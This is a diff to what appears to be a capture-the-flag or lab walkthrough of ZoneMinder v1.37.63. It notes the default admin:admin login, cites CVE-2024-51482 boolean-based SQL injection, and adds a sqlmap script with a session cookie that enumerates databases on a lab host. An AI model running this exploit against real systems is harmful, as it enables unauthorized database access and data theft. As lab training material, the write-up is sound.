@@ -56,3 +56,14 @@ Note that Zoneminder has default credentials so when using `admin:admin` we are 
 CVE and Zoneminder v1.37.63 placed into the search bar reveals [CVE-2024-51482](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)
 
 Zoneminder v1.37.63 is vulnerable to boolean-based SQL Injection. The impact of this is total control of SQL Databases: loss of data confidentiality and integrity. Leading to information disclosure and possible privilege escalation.
+
+We can exploit the vulnerability and use the PoC provided. We can grab the session ID and automate it using the `zmPoC.sh` file.
+
+```
+#!/bin/bash
+
+sqlmap -u 'http://10.129.61.151/zm/index.php?view=request&request=event&action=removetag&tid=1' \
+	--cookie="ZMSESSID=SESSION_COOKIE_HERE" \
+	-p tid --dbms=mysql --batch --dbs
+```
+
